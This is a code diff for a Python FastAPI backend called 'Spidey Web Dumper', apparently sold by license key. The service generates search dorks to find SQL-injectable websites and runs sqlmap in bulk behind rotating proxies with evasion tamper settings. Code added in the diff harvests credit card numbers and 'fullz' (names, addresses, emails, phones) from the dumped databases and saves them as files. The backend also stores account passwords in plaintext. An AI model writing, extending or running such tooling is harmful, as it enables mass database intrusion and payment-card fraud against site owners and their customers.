@@ -1,6 +1,7 @@
 """
-Spidey Web Dumper — FastAPI Backend (CLEAN v3.0)
-Saare fixes: SQLi scan, proxy check, cancel, toasts, disk persistence
+Spidey Web Dumper — FastAPI Backend (CLEAN v5.0)
+Saare processes fix: keywords, dorks, parser, sqli, dump, proxy
++ alldumps.txt feature
 """
 import os
 import io
@@ -70,7 +71,7 @@ FAILED_LOG_FILE   = os.path.join(DATA_DIR, "failed_logins.json")
 TASKS_FILE        = os.path.join(DATA_DIR, "active_tasks.json")
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  🛡️ SECURITY CONFIG
+#  SECURITY
 # ═══════════════════════════════════════════════════════════════════════════
 ALLOWED_IPS_ENV = os.environ.get("ALLOWED_IPS", "").strip()
 ALLOWED_IPS = [ip.strip() for ip in ALLOWED_IPS_ENV.split(",") if ip.strip()]
@@ -94,21 +95,16 @@ SESSIONS = {}
 #  APP INIT
 # ═══════════════════════════════════════════════════════════════════════════
 app = FastAPI(title="Spidey Web Dumper", docs_url=None, redoc_url=None)
-
 templates = Jinja2Templates(directory=str(TEMPLATES_DIR))
 app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
-
 serializer = URLSafeTimedSerializer(SECRET_KEY)
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  HELPERS
-# ═══════════════════════════════════════════════════════════════════════════
+
 def render(name: str, ctx: dict):
     if "request" not in ctx:
         raise ValueError(f"render() called without request for {name}")
-    return templates.TemplateResponse(
-        request=ctx["request"], name=name, context=ctx,
-    )
+    return templates.TemplateResponse(request=ctx["request"], name=name, context=ctx)
+
 
 def _load_json(path: str, default):
     try:
@@ -116,6 +112,7 @@ def _load_json(path: str, default):
             return json.load(f)
     except Exception:
         return default
+
 
 def _save_json(path: str, data):
     try:
@@ -125,7 +122,7 @@ def _save_json(path: str, data):
         logger.error(f"save_json {path}: {e}")
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  🛡️ SECURITY HELPERS
+#  SECURITY HELPERS
 # ═══════════════════════════════════════════════════════════════════════════
 def get_client_ip(request: Request) -> str:
     fwd = request.headers.get("x-forwarded-for", "")
@@ -136,10 +133,12 @@ def get_client_ip(request: Request) -> str:
         return real.strip()
     return request.client.host if request.client else "unknown"
 
+
 def check_ip_whitelist(ip: str) -> bool:
     if not ALLOWED_IPS:
         return True
     return ip in ALLOWED_IPS
+
 
 def check_rate_limit(ip: str, max_attempts: int = RATE_MAX, window: int = RATE_WINDOW) -> bool:
     now = time.time()
@@ -149,6 +148,7 @@ def check_rate_limit(ip: str, max_attempts: int = RATE_MAX, window: int = RATE_W
         return False
     attempts.append(now)
     return True
+
 
 def check_lockout(ip: str):
     if ip in LOCKED_IPS:
@@ -160,6 +160,7 @@ def check_lockout(ip: str):
             del LOCKED_IPS[ip]
             FAILED_LOGINS[ip] = 0
     return True, 0
+
 
 def record_failed_login(ip: str, username: str):
     FAILED_LOGINS[ip] += 1
@@ -177,15 +178,18 @@ def record_failed_login(ip: str, username: str):
     except Exception:
         pass
 
+
 def reset_failed_logins(ip: str):
     FAILED_LOGINS[ip] = 0
     if ip in LOCKED_IPS:
         del LOCKED_IPS[ip]
 
+
 def make_fingerprint(request: Request) -> str:
     ua = request.headers.get("user-agent", "")
     lang = request.headers.get("accept-language", "")
     return hashlib.sha256(f"{ua}|{lang}".encode()).hexdigest()[:16]
+
 
 def check_strong_password(password: str):
     if len(password) < 8:
@@ -221,11 +225,14 @@ def load_users() -> dict:
         _save_json(USERS_FILE, d)
     return d
 
+
 def save_users(d: dict):
     _save_json(USERS_FILE, d)
 
+
 def get_user(uid: str) -> Optional[dict]:
     return load_users().get(uid)
+
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  LICENSE KEYS
@@ -241,12 +248,15 @@ PLANS = {
     "90d": {"label": "90 Days",  "delta": timedelta(days=90),   "price": "$120"},
 }
 
+
 def load_keys() -> dict:
     d = _load_json(KEYS_FILE, {})
     return d if isinstance(d, dict) else {}
 
+
 def save_keys(d: dict):
     _save_json(KEYS_FILE, d)
+
 
 def generate_license_key() -> str:
     parts = ["".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5)) for _ in range(4)]
@@ -259,12 +269,14 @@ def load_last_responses() -> dict:
     d = _load_json(LAST_RESP_FILE, {})
     return d if isinstance(d, dict) else {}
 
+
 def save_last_response(uid: str, action: str, data: dict):
     d = load_last_responses()
     if uid not in d:
         d[uid] = {}
     d[uid][action] = {**data, "timestamp": datetime.now().isoformat()}
     _save_json(LAST_RESP_FILE, d)
+
 
 def get_last_response(uid: str, action: str = None) -> dict:
     d = load_last_responses()
@@ -274,10 +286,9 @@ def get_last_response(uid: str, action: str = None) -> dict:
     return user_data
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  TASK SYSTEM (with disk persistence)
+#  TASK SYSTEM
 # ═══════════════════════════════════════════════════════════════════════════
 TASKS: Dict[str, dict] = {}
-TASKS_LOCK = asyncio.Lock()
 
 
 def load_tasks_from_disk():
@@ -315,7 +326,7 @@ def new_task(uid: str, task_type: str, meta: dict = None) -> str:
         "id": tid, "uid": uid, "type": task_type,
         "status": "starting", "started": datetime.now().isoformat(),
         "progress": {"done": 0, "total": 0, "found": 0, "live": 0,
-                     "cards": 0, "fullz": 0, "msg": "Starting...", "log": []},
+                     "cards": 0, "fullz": 0, "dumps": 0, "msg": "Starting...", "log": []},
         "result": None, "error": None, "meta": meta or {},
     }
     save_tasks_to_disk()
@@ -372,6 +383,7 @@ def cleanup_old_tasks(max_age_hours: int = 24):
 def create_session_token(username: str) -> str:
     return serializer.dumps({"u": username, "t": time.time()})
 
+
 def verify_session_token(token: str) -> Optional[str]:
     if not token:
         return None
@@ -380,6 +392,7 @@ def verify_session_token(token: str) -> Optional[str]:
         return data.get("u")
     except Exception:
         return None
+
 
 def get_current_user(request: Request) -> Optional[str]:
     token = request.cookies.get("spidey_session")
@@ -399,6 +412,7 @@ def get_current_user(request: Request) -> Optional[str]:
         return sess["uid"]
     return verify_session_token(token)
 
+
 def require_user(request: Request) -> str:
     uid = get_current_user(request)
     if not uid:
@@ -414,6 +428,7 @@ def require_user(request: Request) -> str:
         except ValueError:
             pass
     return uid
+
 
 def require_admin(request: Request) -> str:
     uid = require_user(request)
@@ -438,6 +453,7 @@ def check_quota(uid: str, action: str, amount: int = 1):
         return False, remaining
     return True, limit - used - amount
 
+
 def consume_quota(uid: str, action: str, amount: int = 1):
     user = get_user(uid)
     if not user or user.get("is_admin"):
@@ -450,13 +466,14 @@ def consume_quota(uid: str, action: str, amount: int = 1):
     save_users(users)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  PROXY
+#  PROXY HELPERS
 # ═══════════════════════════════════════════════════════════════════════════
 def get_user_proxies(uid: str) -> List[str]:
     user = get_user(uid)
     if not user:
         return []
     return user.get("proxies", [])
+
 
 def get_proxy_stats(uid: str) -> dict:
     user = get_user(uid)
@@ -471,6 +488,7 @@ def get_proxy_stats(uid: str) -> dict:
         "checked_at": stats.get("checked_at"),
     }
 
+
 def save_user_proxies(uid: str, proxies: List[str]):
     users = load_users()
     if uid not in users:
@@ -484,6 +502,7 @@ def save_user_proxies(uid: str, proxies: List[str]):
     users[uid]["proxies"] = clean
     save_users(users)
 
+
 def save_proxy_stats(uid: str, live: int, dead: int, total: int):
     users = load_users()
     if uid not in users:
@@ -494,17 +513,13 @@ def save_proxy_stats(uid: str, live: int, dead: int, total: int):
     }
     save_users(users)
 
-def pick_proxy(uid: str) -> str:
-    import random
-    pool = get_user_proxies(uid)
-    return random.choice(pool) if pool else ""
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  FILE HELPERS
 # ═══════════════════════════════════════════════════════════════════════════
 def safe_filename(name: str) -> str:
     name = os.path.basename(name)
     return "".join(c for c in name if c.isalnum() or c in "._-")
+
 
 def save_output(uid: str, filename: str, content: str) -> str:
     safe = safe_filename(filename)
@@ -513,6 +528,7 @@ def save_output(uid: str, filename: str, content: str) -> str:
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
     return final
+
 
 def list_outputs() -> List[dict]:
     out = []
@@ -532,7 +548,7 @@ def list_outputs() -> List[dict]:
     return out
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — AUTH
+#  AUTH ROUTES
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/", response_class=HTMLResponse)
 async def root(request: Request):
@@ -541,12 +557,14 @@ async def root(request: Request):
         return RedirectResponse("/dashboard", status_code=302)
     return RedirectResponse("/login", status_code=302)
 
+
 @app.get("/login", response_class=HTMLResponse)
 async def login_page(request: Request, error: str = None, msg: str = None):
     uid = get_current_user(request)
     if uid:
         return RedirectResponse("/dashboard", status_code=302)
     return render("login.html", {"request": request, "error": error, "msg": msg})
+
 
 @app.post("/login")
 async def login_submit(request: Request, username: str = Form(...), password: str = Form(...)):
@@ -586,6 +604,7 @@ async def login_submit(request: Request, username: str = Form(...), password: st
     resp.set_cookie("spidey_session", token, httponly=True, secure=True, max_age=SESSION_MAX_AGE, samesite="strict")
     return resp
 
+
 @app.get("/logout")
 async def logout(request: Request):
     token = request.cookies.get("spidey_session")
@@ -595,58 +614,42 @@ async def logout(request: Request):
     resp.delete_cookie("spidey_session")
     return resp
 
+
 @app.get("/register", response_class=HTMLResponse)
 async def register_page(request: Request, error: str = None, msg: str = None):
+    uid = get_current_user(request)
+    if uid:
+        return RedirectResponse("/dashboard", status_code=302)
     return render("register.html", {"request": request, "error": error, "msg": msg})
 
+
 @app.post("/register")
-async def register_submit(
-    request: Request,
-    username: str = Form(...),
-    password: str = Form(...),
-    license_key: str = Form(...),
-):
-    """Register with license key validation"""
+async def register_submit(request: Request, username: str = Form(...), password: str = Form(...), license_key: str = Form(...)):
     ip = get_client_ip(request)
-    
-    # IP + rate limit
     if not check_ip_whitelist(ip):
         return RedirectResponse("/register?error=Access+denied", status_code=302)
     if not check_rate_limit(ip, max_attempts=10, window=300):
         return RedirectResponse("/register?error=Too+many+attempts", status_code=302)
-    
     username = username.strip().lower()
-    
-    # Validate username
-    if not username or len(username) < 3 or len(username) > 20:
+    if len(username) < 3 or len(username) > 20:
         return RedirectResponse("/register?error=Username+must+be+3-20+chars", status_code=302)
-    if not username.isalnum() and not all(c.isalnum() or c == "_" for c in username):
+    if not all(c.isalnum() or c == "_" for c in username):
         return RedirectResponse("/register?error=Only+letters+numbers+underscore", status_code=302)
-    
-    # Validate password
     ok, msg = check_strong_password(password)
     if not ok:
         return RedirectResponse(f"/register?error={msg.replace(' ', '+')}", status_code=302)
-    
-    # Check existing user
     users = load_users()
     if username in users:
         return RedirectResponse("/register?error=Username+taken", status_code=302)
-    
-    # ✅ VALIDATE LICENSE KEY
     key = license_key.strip().upper()
     keys = load_keys()
     if key not in keys:
         return RedirectResponse("/register?error=Invalid+license+key", status_code=302)
-    
     key_data = keys[key]
     if key_data.get("used_by"):
         return RedirectResponse("/register?error=Key+already+used", status_code=302)
-    
-    # ✅ CREATE USER
     plan_code = key_data.get("plan", "1d")
     plan = PLANS.get(plan_code, PLANS["1d"])
-    
     users[username] = {
         "username": username,
         "password": password,
@@ -656,29 +659,25 @@ async def register_submit(
         "plan_label": plan["label"],
         "expires": (datetime.now() + plan["delta"]).isoformat(),
         "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
-        "limits": {
-            "keywords": 500000, "dorks": 500000, "urls": 500000,
-            "sqli": 100000, "dumps": 1000,
-        },
+        "limits": {"keywords": 500_000, "dorks": 500_000, "urls": 500_000, "sqli": 100_000, "dumps": 1_000},
         "proxies": [],
         "proxy_stats": {"live": 0, "dead": 0, "total": 0, "checked_at": None},
     }
     save_users(users)
-    
-    # ✅ MARK KEY AS USED
     keys[key]["used_by"] = username
     keys[key]["used_at"] = datetime.now().isoformat()
     save_keys(keys)
-    
-    logger.info(f"[register] New user: {username} | plan: {plan_code} | key: {key[:10]}...")
+    logger.info(f"[register] New user: {username} | plan: {plan_code}")
     return RedirectResponse("/login?msg=Account+created!+Login+now", status_code=302)
+
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — REDEEM
+#  REDEEM
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/redeem", response_class=HTMLResponse)
 async def redeem_page(request: Request):
     uid = require_user(request)
     return render("redeem.html", {"request": request, "uid": uid})
+
 
 @app.post("/redeem")
 async def redeem_submit(request: Request, license_key: str = Form(...)):
@@ -714,7 +713,7 @@ async def redeem_submit(request: Request, license_key: str = Form(...)):
     return RedirectResponse("/dashboard?msg=Plan+activated", status_code=302)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — PAGES
+#  PAGES
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/dashboard", response_class=HTMLResponse)
 async def dashboard(request: Request, msg: str = None, error: str = None):
@@ -754,30 +753,36 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
         "admin_path": ADMIN_PATH,
     })
 
+
 @app.get("/keywords", response_class=HTMLResponse)
 async def keywords_page(request: Request):
     uid = require_user(request)
     return render("keywords.html", {"request": request, "uid": uid, "last": get_last_response(uid, "keywords")})
+
 
 @app.get("/dorks", response_class=HTMLResponse)
 async def dorks_page(request: Request):
     uid = require_user(request)
     return render("dorks.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dorks")})
 
+
 @app.get("/parser", response_class=HTMLResponse)
 async def parser_page(request: Request):
     uid = require_user(request)
     return render("parser.html", {"request": request, "uid": uid, "last": get_last_response(uid, "parser"), "proxies_count": len(get_user_proxies(uid))})
+
 
 @app.get("/sqli", response_class=HTMLResponse)
 async def sqli_page(request: Request):
     uid = require_user(request)
     return render("sqli.html", {"request": request, "uid": uid, "last": get_last_response(uid, "sqli")})
 
+
 @app.get("/dump", response_class=HTMLResponse)
 async def dump_page(request: Request):
     uid = require_user(request)
     return render("dump.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dump")})
+
 
 @app.get("/files", response_class=HTMLResponse)
 async def files_page(request: Request):
@@ -788,12 +793,14 @@ async def files_page(request: Request):
         user_files = files
     return render("files.html", {"request": request, "uid": uid, "files": user_files})
 
+
 @app.get("/proxy", response_class=HTMLResponse)
 async def proxy_page(request: Request):
     uid = require_user(request)
     proxies = get_user_proxies(uid)
     stats = get_proxy_stats(uid)
     return render("proxy.html", {"request": request, "uid": uid, "proxies": proxies, "count": len(proxies), "proxy_stats": stats})
+
 
 @app.get("/settings", response_class=HTMLResponse)
 async def settings_page(request: Request):
@@ -804,21 +811,25 @@ async def settings_page(request: Request):
         "sqlmap_defaults": {"level": 3, "risk": 2, "threads": 10, "technique": "BEUSTQ", "tamper": "space2comment,between,charencode", "crawl": 0},
     })
 
+
 @app.get("/profile", response_class=HTMLResponse)
 async def profile_page(request: Request):
     uid = require_user(request)
     user = get_user(uid)
     return render("profile.html", {"request": request, "uid": uid, "user": user, "last": get_last_response(uid)})
 
+
 @app.get("/plans", response_class=HTMLResponse)
 async def plans_page(request: Request):
     uid = require_user(request)
     return render("plans.html", {"request": request, "uid": uid, "plans": PLANS})
 
+
 @app.get("/help", response_class=HTMLResponse)
 async def help_page(request: Request):
     uid = require_user(request)
     return render("help.html", {"request": request, "uid": uid})
+
 
 @app.get("/logs", response_class=HTMLResponse)
 async def logs_page(request: Request):
@@ -828,7 +839,7 @@ async def logs_page(request: Request):
     return render("logs.html", {"request": request, "uid": uid, "tasks": user_tasks[:50]})
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — KEYWORDS
+#  KEYWORDS
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/keywords/generate")
 async def api_keywords_generate(request: Request, seeds: str = Form(...), count: int = Form(1000)):
@@ -844,15 +855,28 @@ async def api_keywords_generate(request: Request, seeds: str = Form(...), count:
     asyncio.create_task(_run_keywords(tid, uid, seed_list, count))
     return {"task_id": tid}
 
+
 async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
     try:
+        logger.info(f"[keywords:{tid}] STARTED")
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} keywords...", total=count)
         add_log(tid, f"Generating {count} keywords")
+
         from core.generators import generate_keywords
         loop = asyncio.get_running_loop()
         kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
         kws = kws[:count]
+
+        total_kws = len(kws)
+        step = max(1, total_kws // 20)
+        for i in range(0, total_kws, step):
+            if is_cancelled(tid):
+                add_log(tid, "⛔ Cancelled")
+                return
+            update_progress(tid, done=i, total=total_kws, msg=f"Generating... {i}/{total_kws}")
+            await asyncio.sleep(0.05)
+
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"keywords_{len(kws)}_{ts}.txt", "\n".join(kws))
         consume_quota(uid, "keywords", len(kws))
@@ -861,11 +885,258 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
         update_progress(tid, done=len(kws), total=len(kws), msg="✅ Done!")
         add_log(tid, f"✅ Generated {len(kws)} keywords")
     except Exception as e:
-        logger.exception(f"[keywords] {e}")
+        logger.exception(f"[keywords:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
 
+
+
+
+
+
+async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
+    """Dump with CC + Fullz + AllDumps capture"""
+    try:
+        logger.info(f"[dump:{tid}] STARTED")
+        update_task(tid, status="running")
+        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
+        proxies = get_user_proxies(uid)
+
+        from core.sqlmap_api import api_dump_multiple
+        from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
+
+        all_cards = set()
+        all_fullz = []
+        all_raw_dumps = []
+        last_edit = [time.time()]
+
+        async def on_prog(done, total, success):
+            if is_cancelled(tid):
+                return
+            now = time.time()
+            if now - last_edit[0] < 1.0:
+                return
+            last_edit[0] = now
+            update_progress(
+                tid, done=done, total=total,
+                cards=len(all_cards), fullz=len(all_fullz),
+                msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}"
+            )
+
+        async def on_result(r, zip_bytes):
+            # Extract CC
+            if getattr(r, "cards", None):
+                for c in r.cards:
+                    all_cards.add(c)
+            
+            # Extract Fullz
+            try:
+                src = getattr(r, "csv_dir", "") or ""
+                if src and os.path.isdir(src):
+                    recs = extract_fullz_from_dir(src)
+                    if recs:
+                        all_fullz.extend(recs)
+            except Exception as e:
+                logger.error(f"[dump] fullz extract: {e}")
+            
+            # Capture raw dump
+            try:
+                dump_text = _capture_raw_dump(r)
+                if dump_text:
+                    all_raw_dumps.append(dump_text)
+                    n_lines = len(dump_text.splitlines())
+                    add_log(tid, f"📦 {r.url[:50]} | {n_lines} lines")
+                else:
+                    add_log(tid, f"⚠️ {r.url[:50]} | No data")
+            except Exception as e:
+                logger.exception(f"[dump] raw capture failed: {e}")
+                add_log(tid, f"⚠️ {r.url[:50]} | Capture fail")
+
+        try:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
+                task_id=tid,
+            )
+        except TypeError:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
+            )
+
+        all_cards = list(all_cards)
+        ts = datetime.now().strftime("%d%m%y_%H%M%S")
+        result = {}
+
+        if all_cards:
+            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
+            result["cards_file"] = cc_name
+            result["cards"] = len(all_cards)
+            consume_quota(uid, "cards", len(all_cards))
+
+        if all_fullz:
+            seen = set()
+            dedup = []
+            for rec in all_fullz:
+                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
+                if key in seen:
+                    continue
+                seen.add(key)
+                dedup.append(rec)
+            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
+            if rich:
+                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
+                                       "\n".join(fullz_records_to_lines(rich, "full")))
+                result["fullz_file"] = fz_name
+                result["fullz"] = len(rich)
+                consume_quota(uid, "fullz", len(rich))
+
+        if all_raw_dumps:
+            content = "\n".join(all_raw_dumps)
+            n_lines = len(content.splitlines())
+            al_name = save_output(uid, f"alldumps_{n_lines}_{ts}.txt", content)
+            result["alldump_file"] = al_name
+            result["alldump_lines"] = n_lines
+        else:
+            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data extracted\n# URLs may not be vulnerable")
+            result["alldump_file"] = al_name
+            result["alldump_lines"] = 0
+
+        consume_quota(uid, "dumps", len(urls))
+        save_last_response(uid, "dump", {
+            "tested": len(urls),
+            "cards": result.get("cards", 0),
+            "fullz": result.get("fullz", 0),
+            "alldump_lines": result.get("alldump_lines", 0),
+            "cards_file": result.get("cards_file", ""),
+            "fullz_file": result.get("fullz_file", ""),
+            "alldump_file": result.get("alldump_file", ""),
+        })
+        update_task(tid, status="done", result=result)
+        update_progress(tid, done=len(urls), total=len(urls),
+                        cards=result.get("cards", 0),
+                        fullz=result.get("fullz", 0),
+                        msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Dumps:{result.get('alldump_lines',0)}")
+        add_log(tid, f"✅ Done — CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Raw:{result.get('alldump_lines',0)}")
+        logger.info(f"[dump:{tid}] DONE")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
+    except Exception as e:
+        logger.exception(f"[dump:{tid}] ERROR")
+        update_task(tid, status="error", error=str(e))
+        add_log(tid, f"❌ Error: {str(e)[:200]}")
+        
+        
+        
+        
+def _capture_raw_dump(result) -> str:
+    """Capture ALL data from sqlmap result for alldumps.txt"""
+    lines = []
+    url = getattr(result, "url", "unknown")
+    lines.append("# " + "=" * 68)
+    lines.append(f"# URL: {url}")
+    lines.append(f"# Task: {getattr(result, 'taskid', '')}")
+    lines.append(f"# Success: {getattr(result, 'success', False)}")
+    lines.append(f"# DBMS: {getattr(result, 'dbms', '') or getattr(result, 'banner', '')}")
+    lines.append(f"# User: {getattr(result, 'current_user', '')}")
+    lines.append(f"# Database: {getattr(result, 'current_db', '')}")
+    lines.append("# " + "=" * 68)
+    lines.append("")
+
+    # 1. Tables
+    tables = getattr(result, "tables", []) or []
+    if tables:
+        lines.append(f"### TABLES FOUND ({len(tables)})")
+        for t in tables:
+            if isinstance(t, dict):
+                for db_name, tlist in t.items():
+                    lines.append(f"# DB: {db_name}")
+                    if isinstance(tlist, list):
+                        for tbl in tlist:
+                            lines.append(f"  - {tbl}")
+            else:
+                lines.append(f"  - {t}")
+        lines.append("")
+
+    # 2. Data rows
+    data_rows = getattr(result, "data_rows", []) or []
+    if data_rows:
+        lines.append(f"### DATA ROWS ({len(data_rows)})")
+        for item in data_rows:
+            tbl = item.get("table", "unknown") if isinstance(item, dict) else "unknown"
+            row = item.get("row", item) if isinstance(item, dict) else item
+            if isinstance(row, dict):
+                row_str = "|".join(f"{k}={v}" for k, v in row.items())
+            elif isinstance(row, (list, tuple)):
+                row_str = "|".join(str(c) for c in row)
+            else:
+                row_str = str(row)
+            lines.append(f"[{tbl}] {row_str}")
+        lines.append("")
+
+    # 3. CSV files
+    csv_files = getattr(result, "csv_files", []) or []
+    csv_dir = getattr(result, "csv_dir", "") or ""
+    if csv_dir and os.path.isdir(csv_dir) and not csv_files:
+        for root, _, files in os.walk(csv_dir):
+            for fn in files:
+                if fn.endswith(".csv"):
+                    csv_files.append(os.path.join(root, fn))
+
+    if csv_files:
+        lines.append(f"### CSV FILES ({len(csv_files)})")
+        for fpath in csv_files[:20]:
+            try:
+                fname = os.path.basename(fpath)
+                lines.append("")
+                lines.append(f"--- {fname} ---")
+                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                    content_lines = content.splitlines()[:500]
+                    lines.extend(content_lines)
+                    if len(content.splitlines()) > 500:
+                        lines.append(f"... [{len(content.splitlines()) - 500} more lines]")
+            except Exception as e:
+                lines.append(f"# CSV read error: {e}")
+        lines.append("")
+
+    # 4. Raw log
+    raw_output = getattr(result, "raw_output", "") or ""
+    log_lines = getattr(result, "log_lines", []) or []
+    if not raw_output and log_lines:
+        raw_output = "\n".join(log_lines)
+
+    if raw_output:
+        lines.append(f"### SQLMAP LOG (last 100 lines)")
+        log_split = raw_output.splitlines()
+        for line in log_split[-100:]:
+            lines.append(line)
+        lines.append("")
+
+    # 5. Cards
+    cards = getattr(result, "cards", []) or []
+    if cards:
+        lines.append(f"### CARDS ({len(cards)})")
+        for c in cards:
+            lines.append(str(c))
+        lines.append("")
+
+    # 6. Empty case
+    if len(lines) <= 9:
+        lines.append("")
+        lines.append("# ⚠️ NO DATA EXTRACTED")
+        lines.append("# Reasons: URL not vulnerable / no permission / sqlmap timeout / empty tables")
+        lines.append("")
+
+    lines.append("")
+    lines.append("")
+    return "\n".join(lines)
+            
+        
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — DORKS
+#  DORKS
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/dorks/generate")
 async def api_dorks_generate(request: Request, keywords: str = Form(...), count: int = Form(5000), dork_type: str = Form("normal")):
@@ -881,10 +1152,14 @@ async def api_dorks_generate(request: Request, keywords: str = Form(...), count:
     asyncio.create_task(_run_dorks(tid, uid, kws, count, dork_type))
     return {"task_id": tid}
 
+
 async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str):
     try:
+        logger.info(f"[dorks:{tid}] STARTED")
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} dorks ({dtype})...", total=count)
+        add_log(tid, f"Type: {dtype}")
+
         from core.generators import (
             generate_dorks, generate_hq_sqli_dorks, generate_country_dorks,
             generate_cms_dorks, generate_exposed_dorks,
@@ -901,79 +1176,29 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         else:
             dorks = await loop.run_in_executor(None, generate_dorks, kws, count)
         dorks = dorks[:count]
+
+        total_d = len(dorks)
+        step = max(1, total_d // 20)
+        for i in range(0, total_d, step):
+            if is_cancelled(tid):
+                add_log(tid, "⛔ Cancelled")
+                return
+            update_progress(tid, done=i, total=total_d, msg=f"Generating... {i}/{total_d}")
+            await asyncio.sleep(0.05)
+
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"dorks_{dtype}_{len(dorks)}_{ts}.txt", "\n".join(dorks))
         consume_quota(uid, "dorks", len(dorks))
         save_last_response(uid, "dorks", {"count": len(dorks), "type": dtype, "file": fname})
         update_task(tid, status="done", result={"count": len(dorks), "file": fname, "type": dtype})
         update_progress(tid, done=len(dorks), total=len(dorks), msg="✅ Done!")
+        add_log(tid, f"✅ Generated {len(dorks)} dorks")
     except Exception as e:
-        logger.exception(f"[dorks] {e}")
+        logger.exception(f"[dorks:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
 
-
-
-
-
-async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
-    """🎯 CLEAN Proxy Check — no hang, live progress"""
-    try:
-        total = len(proxies)
-        logger.info(f"[proxy_check:{tid}] STARTED with {total} proxies")
-        
-        update_task(tid, status="running")
-        update_progress(tid, done=0, total=total, live=0, msg=f"Checking {total} proxies...")
-        add_log(tid, f"⚡ Checking {total} proxies...")
-        
-        from core.proxy import check_proxies_bulk
-        last_edit = [time.time()]
-        
-        async def on_prog(checked, tot, live):
-            if is_cancelled(tid):
-                return
-            now = time.time()
-            if now - last_edit[0] >= 1.0:
-                last_edit[0] = now
-                update_progress(tid, done=checked, total=tot, live=live,
-                                msg=f"Checked {checked}/{tot} | Live {live}")
-                logger.info(f"[proxy_check:{tid}] {checked}/{tot} | Live {live}")
-        
-        live_list = await check_proxies_bulk(
-            proxies, timeout=5.0, concurrency=300, progress_callback=on_prog
-        )
-        
-        logger.info(f"[proxy_check:{tid}] Done. Live: {len(live_list)}")
-        
-        if is_cancelled(tid):
-            add_log(tid, "⛔ Cancelled")
-            update_progress(tid, msg="⛔ Cancelled")
-            return
-        
-        dead_count = total - len(live_list)
-        save_user_proxies(uid, live_list)
-        save_proxy_stats(uid, live=len(live_list), dead=dead_count, total=total)
-        save_last_response(uid, "proxy_check", {
-            "checked": total, "live": len(live_list), "dead": dead_count
-        })
-        
-        update_task(tid, status="done", result={
-            "checked": total, "live": len(live_list), "dead": dead_count
-        })
-        update_progress(tid, done=total, total=total, live=len(live_list), msg="✅ Done!")
-        add_log(tid, f"✅ Live: {len(live_list)}/{total} | Dead: {dead_count}")
-        logger.info(f"[proxy_check:{tid}] FINISHED")
-        
-    except asyncio.CancelledError:
-        add_log(tid, "⛔ Cancelled")
-        update_progress(tid, msg="⛔ Cancelled")
-    except Exception as e:
-        logger.exception(f"[proxy_check:{tid}] ERROR")
-        update_task(tid, status="error", error=str(e))
-        add_log(tid, f"❌ Error: {str(e)[:200]}")
-        
-        
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — PARSER
+#  PARSER
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/parser/run")
 async def api_parser_run(request: Request, dorks: str = Form(...)):
@@ -987,33 +1212,101 @@ async def api_parser_run(request: Request, dorks: str = Form(...)):
     asyncio.create_task(_run_parser(tid, uid, dork_list))
     return {"task_id": tid}
 
+
 async def _run_parser(tid: str, uid: str, dorks: List[str]):
     try:
+        logger.info(f"[parser:{tid}] STARTED")
+        total = len(dorks)
         update_task(tid, status="running")
-        update_progress(tid, msg=f"Parsing {len(dorks)} dorks...", total=len(dorks))
